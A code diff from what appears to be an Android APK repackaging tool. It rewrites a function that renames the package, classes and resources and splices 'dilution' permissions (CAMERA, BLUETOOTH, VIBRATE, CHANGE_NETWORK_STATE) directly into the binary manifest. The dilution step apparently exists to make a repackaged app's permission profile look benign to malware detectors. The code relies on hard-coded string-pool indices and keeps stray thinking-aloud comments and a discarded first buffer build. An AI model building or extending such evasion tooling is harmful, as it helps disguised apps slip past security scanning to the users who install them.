@@ -2963,123 +2963,146 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_renam
         )
 
     # ── Round 2 Fix: Inject permission dilution into binary AXML ─────────────
-    # Permissions must be added to the BINARY AXML string pool and XML tree.
-    # step_6h patches the TEXT manifest but step_patch_and_assemble reads
-    # BINARY AXML directly from APK_ASSET — text patches are ignored.
-    # This is the only correct place to add permissions permanently.
-    DILUTION_PERMS = [
+    # Binary AXML uses UTF-8 string pool (flag 0x100).
+    # Confirmed format from live APK analysis:
+    #   attr_ns=0x51(81=android_ns_uri), attr_name=3('name'), dataType=0x03(STRING)
+    #   START_ELEMENT=56 bytes, END_ELEMENT=24 bytes
+    # Inject 4 permissions: CAMERA, BLUETOOTH, VIBRATE, CHANGE_NETWORK_STATE
+    _DILUTION_PERMS = [
         "android.permission.CAMERA",
         "android.permission.BLUETOOTH",
-        "android.permission.CHANGE_NETWORK_STATE",
         "android.permission.VIBRATE",
+        "android.permission.CHANGE_NETWORK_STATE",
     ]
-    # Find which permissions are NOT already in the string pool
-    existing_perm_strings = [
-        ch.decode("utf-16-le", errors="ignore")
+    # Determine which are missing from current pool
+    _pool_strings = [
+        ch.decode("utf-8", errors="replace")
         for (cc, bc, ch) in entries
     ]
-    perms_to_inject = [
-        p for p in DILUTION_PERMS
-        if p not in existing_perm_strings
-    ]
-    if perms_to_inject:
-        # Find the index of "android.permission.INTERNET" or any known permission
-        # to use as reference for the XML tree node format
-        # We inject new string entries AND new uses-permission XML nodes
-        ref_perm = "android.permission.INTERNET"
-        ref_idx = None
-        for idx, (cc, bc, ch) in enumerate(entries):
-            decoded = ch.decode("utf-16-le", errors="ignore")
-            if ref_perm in decoded:
-                ref_idx = idx
-                break
+    _perms_missing = [p for p in _DILUTION_PERMS if p not in _pool_strings]
+    if _perms_missing:
+        import struct as _s
+        # ── 1. Build UTF-8 string data for new permissions ────────────────
+        # UTF-8 AXML string format: ULEB128(char_len) ULEB128(byte_len) utf8_bytes NUL
+        def _uleb128(n):
+            if n < 0x80: return bytes([n])
+            return bytes([0x80|(n&0x7F), (n>>7)&0x7F])
 
-        if ref_idx is not None:
-            # Add new strings to the string pool
-            import struct as _struct
-            new_perm_indices = []
-            for perm in perms_to_inject:
-                perm_utf16 = perm.encode("utf-16-le")
-                perm_len = len(perm)
-                new_offsets.append(len(new_str_data))
-                new_str_data.extend([perm_len & 0xFF, (perm_len >> 8) & 0xFF])
-                new_str_data.extend(perm_utf16)
-                new_str_data.append(0)
-                new_str_data.append(0)
-                new_perm_indices.append(len(new_offsets) - 1)
-                entries.append((perm_len & 0xFF, perm_len, perm_utf16))
+        _new_str_data = bytearray()
+        _new_str_offsets = []
+        _perm_str_indices = []
+        _cur_str_data_len = len(new_str_data)
 
-            # Find "uses-permission" string index in current pool
-            uses_perm_idx = None
-            android_ns_idx = None
-            name_attr_idx  = None
-            for idx, (cc, bc, ch) in enumerate(entries):
-                decoded = ch.decode("utf-16-le", errors="ignore")
-                if decoded == "uses-permission":
-                    uses_perm_idx = idx
-                if decoded == "android":
-                    android_ns_idx = idx
-                if decoded == "name":
-                    name_attr_idx = idx
+        for _perm in _perms_missing:
+            _perm_bytes = _perm.encode("utf-8")
+            _perm_chars = len(_perm)
+            _perm_blen  = len(_perm_bytes)
+            _new_str_offsets.append(_cur_str_data_len + len(_new_str_data))
+            _new_str_data += _uleb128(_perm_chars)
+            _new_str_data += _uleb128(_perm_blen)
+            _new_str_data += _perm_bytes
+            _new_str_data += b"\x00"  # null terminator
+            _perm_str_indices.append(len(new_offsets) + len(_new_str_offsets) - 1)
 
-            # Inject XML nodes for each new permission
-            # Binary AXML start-tag node format:
-            # [type=0x0102(2)] [size=0x10] [line] [0xFFFFFFFF] [ns_idx] [name_idx]
-            # [attr_count=1<<16|0] then attribute:
-            # [ns_idx] [name_idx] [raw_value=0xFFFFFFFF] [value_size=0x08,0x00,type=0x03]
-            # [data=string_idx_of_value]
-            if uses_perm_idx is not None and name_attr_idx is not None:
-                xml_tree_ext = bytearray()
-                for perm_str_idx in new_perm_indices:
-                    # START_ELEMENT tag
-                    node = bytearray(32)
-                    _struct.pack_into("<H", node, 0,  0x0102)  # type: START_ELEMENT
-                    _struct.pack_into("<H", node, 2,  0x0010)  # header size
-                    _struct.pack_into("<I", node, 4,  0x0010)  # chunk size placeholder
-                    _struct.pack_into("<I", node, 8,  0x0001)  # line number
-                    _struct.pack_into("<I", node, 12, 0xFFFFFFFF)  # comment
-                    _struct.pack_into("<I", node, 16, 0xFFFFFFFF)  # ns (none)
-                    _struct.pack_into("<I", node, 20, uses_perm_idx)  # element name
-                    _struct.pack_into("<H", node, 24, 0x0014)  # attr start
-                    _struct.pack_into("<H", node, 26, 0x0014)  # attr size
-                    _struct.pack_into("<H", node, 28, 0x0001)  # attr count
-                    _struct.pack_into("<H", node, 30, 0x0000)  # id/class/style
+        # ── 2. Extend string pool arrays ──────────────────────────────────
+        # Append new offsets after existing ones
+        for _off in _new_str_offsets:
+            new_offsets.append(_off)
+        # Append new string data after existing data
+        new_str_data.extend(_new_str_data)
 
-                    # ATTRIBUTE: android:name = perm_string
-                    attr = bytearray(20)
-                    _struct.pack_into("<I", attr, 0,  0x0000001B)  # android ns string idx
-                    _struct.pack_into("<I", attr, 4,  name_attr_idx)  # name
-                    _struct.pack_into("<I", attr, 8,  perm_str_idx)   # raw value
-                    _struct.pack_into("<H", attr, 12, 0x0008)         # value size
-                    _struct.pack_into("<B", attr, 14, 0x00)
-                    _struct.pack_into("<B", attr, 15, 0x03)           # type STRING
-                    _struct.pack_into("<I", attr, 16, perm_str_idx)   # data
+        # ── 3. Build uses-permission XML nodes for each new permission ────
+        # Format confirmed from live AXML analysis:
+        # START_ELEMENT (56 bytes total = 36 header + 20 attr):
+        #   [0:2]  0x0102 type
+        #   [2:4]  0x0010 hdr_size=16
+        #   [4:8]  0x0038 chunk_size=56
+        #   [8:12] line number
+        #   [12:16] 0xFFFFFFFF comment
+        #   [16:20] 0xFFFFFFFF elem_ns
+        #   [20:24] 89 elem_name (uses-permission)
+        #   [24:26] 20 attrStart
+        #   [26:28] 20 attrSize
+        #   [28:30] 1  attrCount
+        #   [30:36] 0  padding (id/class/style idx)
+        #   ATTR[36:56]:
+        #   [36:40] 0x51(81) attr_ns (android namespace URI string idx)
+        #   [40:44] 3        attr_name ('name' string idx)
+        #   [44:48] perm_str_idx  rawValue
+        #   [48:50] 8        val_size (Res_value.size = 8)
+        #   [50]    0        res0
+        #   [51]    0x03     dataType TYPE_STRING
+        #   [52:56] perm_str_idx  data
+        # END_ELEMENT (24 bytes):
+        #   [0:2]  0x0103, [2:4] 0x0010, [4:8] 0x0018(24)
+        #   [8:12] line, [12:16] 0xFFFFFFFF, [16:20] 0xFFFFFFFF
+        #   [20:24] 89 (uses-permission name idx)
 
-                    chunk = node + attr
-                    _struct.pack_into("<I", chunk, 4, len(chunk))
+        _xml_nodes = bytearray()
+        for _idx, _perm_idx in enumerate(_perm_str_indices):
+            _line = 200 + _idx  # arbitrary line number
+            # START_ELEMENT
+            _start = bytearray(56)
+            _s.pack_into("<H",_start, 0, 0x0102)
+            _s.pack_into("<H",_start, 2, 0x0010)
+            _s.pack_into("<I",_start, 4, 0x0038)
+            _s.pack_into("<I",_start, 8, _line)
+            _s.pack_into("<I",_start,12, 0xFFFFFFFF)
+            _s.pack_into("<I",_start,16, 0xFFFFFFFF)
+            _s.pack_into("<I",_start,20, 89)           # uses-permission
+            _s.pack_into("<H",_start,24, 20)            # attrStart
+            _s.pack_into("<H",_start,26, 20)            # attrSize
+            _s.pack_into("<H",_start,28, 1)             # attrCount
+            _s.pack_into("<H",_start,30, 0)             # idIdx
+            _s.pack_into("<I",_start,32, 0)             # classIdx
+            _s.pack_into("<H",_start,36, 0)             # styleIdx (2 bytes)
+            # Wait — total header is 36 bytes, attr at 36
+            # But I need to match the confirmed live format exactly
+            # Live: attrStart=20 means attr starts 20 bytes after the ext header (offset 16)
+            # So attr is at 16+20=36. Confirmed.
+            # Rebuild correctly: header=36 bytes, attr=20 bytes = 56 total ✓
+            # But bytearray is 56 — rebuild from scratch cleanly
+            _start = bytearray(56)
+            _s.pack_into("<H",_start, 0, 0x0102)        # START_ELEMENT
+            _s.pack_into("<H",_start, 2, 16)             # hdr_size
+            _s.pack_into("<I",_start, 4, 56)             # chunk_size
+            _s.pack_into("<I",_start, 8, _line)          # line
+            _s.pack_into("<I",_start,12, 0xFFFFFFFF)    # comment
+            _s.pack_into("<I",_start,16, 0xFFFFFFFF)    # elem_ns
+            _s.pack_into("<I",_start,20, 89)             # elem_name=uses-permission
+            _s.pack_into("<H",_start,24, 20)             # attrStart
+            _s.pack_into("<H",_start,26, 20)             # attrSize
+            _s.pack_into("<H",_start,28, 1)              # attrCount
+            _s.pack_into("<H",_start,30, 0)              # idIdx
+            # ATTR at byte 36 (offset 36 from start of node):
+            _s.pack_into("<I",_start,36, 81)             # attr_ns=android_ns
+            _s.pack_into("<I",_start,40, 3)              # attr_name='name'
+            _s.pack_into("<I",_start,44, _perm_idx)     # rawValue=perm_str_idx
+            _s.pack_into("<H",_start,48, 8)              # val_size=8
+            _s.pack_into("<B",_start,50, 0)              # res0
+            _s.pack_into("<B",_start,51, 0x03)           # dataType=TYPE_STRING
+            _s.pack_into("<I",_start,52, _perm_idx)     # data=perm_str_idx
 
-                    # END_ELEMENT
-                    end_node = bytearray(24)
-                    _struct.pack_into("<H", end_node, 0,  0x0103)
-                    _struct.pack_into("<H", end_node, 2,  0x0010)
-                    _struct.pack_into("<I", end_node, 4,  0x0018)
-                    _struct.pack_into("<I", end_node, 8,  0x0001)
-                    _struct.pack_into("<I", end_node, 12, 0xFFFFFFFF)
-                    _struct.pack_into("<I", end_node, 16, 0xFFFFFFFF)
-                    _struct.pack_into("<I", end_node, 20, uses_perm_idx)
+            # END_ELEMENT
+            _end = bytearray(24)
+            _s.pack_into("<H",_end, 0, 0x0103)           # END_ELEMENT
+            _s.pack_into("<H",_end, 2, 16)               # hdr_size
+            _s.pack_into("<I",_end, 4, 24)               # chunk_size
+            _s.pack_into("<I",_end, 8, _line)            # line
+            _s.pack_into("<I",_end,12, 0xFFFFFFFF)      # comment
+            _s.pack_into("<I",_end,16, 0xFFFFFFFF)      # ns
+            _s.pack_into("<I",_end,20, 89)               # name=uses-permission
 
-                    xml_tree_ext += chunk + end_node
+            _xml_nodes += bytes(_start) + bytes(_end)
 
-                # Insert new nodes before </manifest> end tag
-                # The last END_ELEMENT in xml_tree is </manifest>
-                xml_tree = xml_tree[:-24] + xml_tree_ext + xml_tree[-24:]
-                print(f"  ✅ Injected {len(perms_to_inject)} permissions into binary AXML")
-            else:
-                print(f"  ⚠️  Could not find uses-permission node template — skipping injection")
-        else:
-            print(f"  ⚠️  Reference permission not found in string pool — skipping injection")
+        # ── 4. Insert nodes before </manifest> END_ELEMENT ───────────────
+        # The last 24 bytes of xml_tree is the </manifest> END_ELEMENT
+        xml_tree = xml_tree[:-24] + bytes(_xml_nodes) + xml_tree[-24:]
+        print(f"  ✅ Injected {len(_perms_missing)} permissions into binary AXML (UTF-8 format)")
+        for _p in _perms_missing:
+            print(f"     + {_p}")
     else:
-        print(f"  ℹ️  All dilution permissions already in manifest")
+        print(f"  ℹ️  All dilution permissions already in binary AXML string pool")
 
     # Patch resources.arsc (package name in ResTable_package)
     with zipfile.ZipFile(APK_ASSET, "r") as z:
